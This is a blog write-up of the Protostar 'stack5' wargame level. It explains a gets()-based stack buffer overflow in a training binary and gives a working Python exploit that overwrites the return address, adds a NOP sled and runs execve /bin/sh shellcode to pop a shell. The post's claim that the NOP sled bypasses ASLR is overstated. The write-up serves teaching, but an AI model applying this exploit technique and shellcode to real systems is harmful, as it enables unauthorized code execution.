---
layout: post
title: "stack5 Protostar writeup"
categories: protostar
---

I started solving Protostar from Exploit Exercises and this will be a writeup for [stack level 5](https://exploit-exercises.com/protostar/stack5).

When we check the disassembly of `main` with radare,
![disassembly](/data/stack5/stack5.png)

(Press `p` in visual graph mode to show the address offset)

Function `gets` is called for for variable `local_10h` at `esp+0x10`. Also, instruction at `0x080483ca` shows that stack space for current fucntion's local variables will be `0x50`. Stack will look like this.

![stack layout](/data/stack5/stack_layout.png)

Now if we write 0x48 bytes, last 4 bytes will be the new return address and code flow will be updated.


Using shellcode
---------------

Let us write the shellcode on the stack and update the `return` address to the starting of this shellcode. If you want to know more about shellcodes check this [tutorial](http://www.vividmachines.com/shellcode/shellcode.html).

We will use [this](http://shell-storm.org/shellcode/files/shellcode-811.php) shellcode.
Note: It is an x86 binary.

#### Exploit
- Write 76 bytes of padding for filling stack space. (0x44 i.e 68 and 8 extra bytes due to memory alignment at `0x080483c7`)  
- 4 byte address to starting of shellcode.
- Shellcode

But problem may arise if ASLR (which is not the case here) is active thus we add `nop` sled after the return address. This will help us bypass ASLR.

File: [exploit.py](/data/stack5/exploit_shellcode.py)
```
#! /usr/bin/python2.7
import sys
import struct

stack = struct.pack("I", 0xbffff78c + 100)

nop = '\x90' * 200
sc = "\x31\xc0\x50\x68\x2f\x2f\x73"\
     "\x68\x68\x2f\x62\x69\x6e\x89"\
     "\xe3\x89\xc1\x89\xc2\xb0\x0b"\
     "\xcd\x80\x31\xc0\x40\xcd\x80"

pad = 'A' * 76

print pad+stack+nop+sc
```

Run:

`(python exploit.py 100; cat -) | /opt/protostar/bin/stack5`

This will give us a shell.

##### Explaination
- We will place 76 As and return address, nop sled and shellcode on stack.
- New return address will point to shellcode (or nop sled before shellcode)
- Upon end of main, code flow will redirect to shellcode thus popping a shell.
- `cat -` is to make sure the piped input is not reaching EOF thus preventing the shell from exiting.


Using ret2libc
--------------
Will update this soon. Check the exploit [here](/data/stack5/exploit_ret2libc.py)